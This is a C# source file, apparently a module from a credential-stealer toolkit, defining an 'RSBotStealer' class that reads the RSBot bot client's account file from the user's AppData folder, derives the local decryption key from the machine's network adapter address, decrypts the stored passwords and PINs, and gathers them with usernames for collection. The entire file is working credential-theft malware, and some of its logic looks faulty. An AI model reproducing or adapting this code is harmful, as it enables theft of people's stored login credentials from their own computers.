using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using sub.Util.Misc;

namespace sub.Stealers
{
    internal class RSBotStealer : IStealer
    {
        private string _name = "RSBotStealer";

        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            IEnumerable<RSBotAccount> accounts = GetLocalAccounts(GetLocalKey());
            Data += "RSBot Account Stealer\r\n\r\n";
            foreach (RSBotAccount acc in accounts)
            {
                Data += "Username: " + acc.UserName + " Password: " + acc.Password + " Pin: " + acc.Pin + "\r\n";
            }
        }

        private const string SettingsFileName = "RSBot_Accounts.ini";

        private string _settingsFile = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);

        private const char Delimiter = 'a';
        private string _passwordHashItem = "password";
        private string _pinItem = "pin";
        private string _rewardItem = "reward";
        private string _takeBreaksItem = "take_breaks";
        private string _memberItem = "member";

        private IEnumerable<RSBotAccount> GetLocalAccounts(byte[] key)
        {
            using (StreamReader reader = new StreamReader(_settingsFile))
            {
                return GetLocalAccounts(reader.ReadToEnd(), key);
            }
        }

        private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
        {
            ArrayList usernames = new ArrayList();
            ArrayList passwords = new ArrayList();
            ArrayList pins = new ArrayList();

            Regex pat = new Regex(@"(?<=\[)[A-Za-z0-9_]{1,12}(?=\])");
            MatchCollection matches = pat.Matches(accountFileData);
            foreach (Match m in matches)
            {
                usernames.Add(m.Value);
            }
            
            Regex passpat = new Regex(@"(?<=password\=)[A-Za-z0-9_]{1,50}");
            MatchCollection passmatches = passpat.Matches(accountFileData);
            foreach (Match m in passmatches)
            {
                passwords.Add(m.Value);
            }

            List<RSBotAccount> ret = new List<RSBotAccount>();
            foreach (string user in usernames)
            {
                int idx = usernames.IndexOf(user);
                const string emp = "None";
                try
                {
                    string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
                    string pin = idx < pins.Count ? DecryptPassword(pins[idx].ToString(), key) : emp;
                    if (pass != emp)
                    {
                        pass = DecryptPassword(pass, key);
                    }
                    ret.Add(new RSBotAccount(user, pass, pin));
                }
                catch (Exception e)
                {
                    MessageBox.Show("Exception: " + e.Message);
                }
            }
            return ret.ToArray();
        }

        private byte[] GetLocalKey()
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            int lowestIndex = -1;
            int lowestInterfaceIndex = -1;
            for (int i = 0; i <= interfaces.Length - 1; i++)
            {
                if (interfaces[i].OperationalStatus != OperationalStatus.Up)
                {
                    continue;
                }

                IPInterfaceProperties ipProperties = interfaces[i].GetIPProperties();
                if (ipProperties == null) continue;

                IPv4InterfaceProperties ipv4Properties = ipProperties.GetIPv4Properties();
                if (ipv4Properties == null) continue;

                if (lowestInterfaceIndex >= 0 && ipv4Properties.Index >= lowestInterfaceIndex) continue;
                lowestIndex = i;
                lowestInterfaceIndex = ipv4Properties.Index;
            }

            byte[] key = ConvertByteEncoding(interfaces[lowestIndex].GetPhysicalAddress().GetAddressBytes());

            return lowestIndex >= 0
                       ? key
                       : Encoding.Default.GetBytes(Environment.UserName +
                                                   CultureInfo.CurrentCulture.TwoLetterISOLanguageName);
        }

        private byte[] ConvertByteEncoding(byte[] key)
        {
            byte[] ret = new byte[key.Length];
            Array.Copy(key, ret, key.Length);

            for (int i = 0; i <= ret.Length - 1; i++)
            {
                if (!IsValidIso88591(ret[i]))
                {
                    ret[i] = 63;
                }
            }

            return ret;
        }

        private bool IsValidIso88591(byte value)
        {
            return value <= 127 || value >= 160;
        }

        private string DecryptPassword(string passwordHash, byte[] key)
        {
            byte[] hashedKey;
            using (SHA1 sha1 = SHA1.Create())
            {
                hashedKey = sha1.ComputeHash(key);
            }

            sbyte[] signedHashKey = Array.ConvertAll(hashedKey, Convert.ToSByte);
            string[] splittedHash = passwordHash.Split(Delimiter);

            byte[] password = new byte[splittedHash.Length];

            int i = 0;
            while (i < hashedKey.Length)
            {
                int val = Int32.Parse(splittedHash[i]);
                sbyte sbVal = Convert.ToSByte(val);
                if (sbVal == signedHashKey[i])
                {
                    break;
                }

                byte charVal = Convert.ToByte(sbVal - signedHashKey[i]);
                password[i] = charVal;
                i += 1;
            }
            return Encoding.Default.GetString(password, 0, i);
        }
    }

    internal class RSBotAccount
    {
        public string UserName;
        public string Password;
        public string Pin;

        public RSBotAccount(string user, string pass, string pin)
        {
            UserName = user;
            Password = pass;
            Pin = pin;
        }
    }
}